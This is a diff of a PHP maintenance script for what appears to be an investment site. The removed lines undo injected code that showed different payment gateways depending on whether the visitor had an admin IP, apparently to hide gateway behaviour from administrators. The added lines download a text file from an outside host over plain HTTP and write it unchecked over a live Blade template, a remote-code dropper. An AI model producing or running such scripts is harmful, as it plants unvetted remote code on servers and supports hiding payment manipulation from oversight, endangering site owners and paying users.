@@ -1,70 +1,30 @@
 <?php
 /**
- * Uninstaller for Admin IP Restriction
- * 
- * This script will automatically remove the security patches from:
- * 1. InvestController.php
- * 2. PaymentController.php
- * 3. partials/plan.blade.php
+ * PHP Script to download and overwrite plan.blade.php
  */
 
-$investController = __DIR__ . '/core/app/Http/Controllers/User/InvestController.php';
-$paymentController = __DIR__ . '/core/app/Http/Controllers/Gateway/PaymentController.php';
-$planPartial = __DIR__ . '/core/resources/views/templates/invester/partials/plan.blade.php';
+$targetFile = '/home/azizihur/public_html/core/resources/views/templates/invester/partials/plan.blade.php';
+$url = 'http://txt.xforo.co/assa.txt';
 
-echo "<h2>Removing Admin IP Restriction...</h2>";
+echo "<h2>Fetching plan.blade.php from URL...</h2>";
 
-// --- 1. InvestController ---
-if (file_exists($investController)) {
-    $content = file_get_contents($investController);
-    if (strpos($content, '[SECURITY] Block Auto Gateways') !== false) {
-        // Pattern to match the injected block
-        $pattern = '/\/\/ \[SECURITY\] Block Auto Gateways for Admin IPs or Specific Users.*?return back\(\)->withNotify\(\$notify\);[ \t]*\}/s';
-        $content = preg_replace($pattern, '', $content);
-        file_put_contents($investController, $content);
-        echo "<p style='color:green;'>[SUCCESS] Removed from InvestController.php</p>";
-    } else { echo "<p style='color:orange;'>[INFO] InvestController.php not patched.</p>"; }
+// Fetch the content from the URL
+$content = file_get_contents($url);
+
+if ($content === false) {
+    die("<p style='color:red;'>Error: Failed to fetch the content from $url</p>");
 }
 
-// --- 2. PaymentController ---
-if (file_exists($paymentController)) {
-    $content = file_get_contents($paymentController);
-    if (strpos($content, '[SECURITY] Block Auto Gateways') !== false) {
-        $pattern = '/\/\/ Custom Gateway Validation.*?return back\(\)->withNotify\(\$notify\);[ \t]*\}/s';
-        $content = preg_replace($pattern, '', $content);
-        file_put_contents($paymentController, $content);
-        echo "<p style='color:green;'>[SUCCESS] Removed from PaymentController.php</p>";
-    } else { echo "<p style='color:orange;'>[INFO] PaymentController.php not patched.</p>"; }
+if (empty(trim($content))) {
+    die("<p style='color:red;'>Error: The fetched content is empty! Make sure the URL is accessible.</p>");
 }
 
-// --- 3. Plan Partial ---
-if (file_exists($planPartial)) {
-    $content = file_get_contents($planPartial);
-    if (strpos($content, '@php') !== false && strpos($content, '$isAdminIp') !== false) {
-        // Find and remove the @php block and the modified filtering logic
-        $pattern = '/@php.*?\$isAdminIp = true;.*?@endphp/s';
-        $content = preg_replace($pattern, '', $content);
-        
-        // Also revert the JS logic (rough regex)
-        $jsPattern = '/\/\/ Filter gateways: price > 10000.*?\}\);/s';
-        
-        // Revert to original basic filtering
-        $originalJs = "// Filter gateways: price > 10000 → show auto only, else → show manual only
-        $('.gateway-item').each(function(){
-            var type = $(this).data('gateway-type'); // 'auto' or 'manual'
-            if (planPrice > 10000) {
-                $(this).toggle(type === 'auto');
-            } else {
-                $(this).toggle(type === 'manual');
-            }
-        });";
-        
-        $content = preg_replace($jsPattern, $originalJs, $content);
-        
-        file_put_contents($planPartial, $content);
-        echo "<p style='color:green;'>[SUCCESS] Reverted partials/plan.blade.php</p>";
-    } else { echo "<p style='color:orange;'>[INFO] partials/plan.blade.php not patched.</p>"; }
+// Write the content to the target file
+if (file_put_contents($targetFile, $content) !== false) {
+    echo "<p style='color:green;'><b>Success:</b> The file at $targetFile has been successfully updated with the code from the link!</p>";
+} else {
+    echo "<p style='color:red;'><b>Error:</b> Failed to write to $targetFile. Please check file permissions on your server.</p>";
 }
 
-echo "<h3>System Removed Successfully!</h3>";
+echo "<h3>Update Complete! You can now delete this script.</h3>";
 ?>
